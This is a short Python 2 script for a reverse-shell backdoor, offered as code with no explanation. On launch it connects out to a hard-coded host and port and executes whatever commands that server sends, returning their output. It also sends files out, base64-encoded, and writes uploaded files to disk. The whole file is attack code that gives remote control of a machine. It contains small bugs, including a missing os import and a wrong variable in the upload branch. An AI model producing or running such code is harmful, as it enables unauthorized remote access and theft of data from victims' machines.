
#!/usr/bin/python

import socket
import subprocess
import json
import base64

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.96", 56789))


# helper send and receive functions:
def json_recv():
	data = ""
	while True:
		try:
			data = data + s.recv(1024)
			return json.loads(data)
		except ValueError:
			continue

def json_send(data):
	json_data = json.dumps(data)
	s.send(json_data)



def shell():
	while True:
		server_cmd = json_recv()
		if server_cmd == 'q':
			break
		elif server_cmd[:2] == "cd" and len(server_cmd) > 1:
			try:
				os.chdir(server_cmd[3:])
			except:
				continue
		
		elif server_cmd[:8] == "download":
			with open(server_cmd[9:], "rb") as docs:
				json_send(base64.b64encode(docs.read()))

		elif server_cmd[:6] == "upload":
			with open(server_cmd[7:], "wb") as docs:
				docs_data = json_recv()
				docs.write(base64.b64decode(docs))
		else:
			# if everything goes a expected, this else condition will run
			ps = subprocess.Popen(
				server_cmd,
				shell=True,
				stdout=subprocess.PIPE,
				stdin=subprocess.PIPE,
				stderr=subprocess.PIPE
				)
			result = ps.stdout.read() + ps.stderr.read()
			json_send(result)


shell()
#s.close()



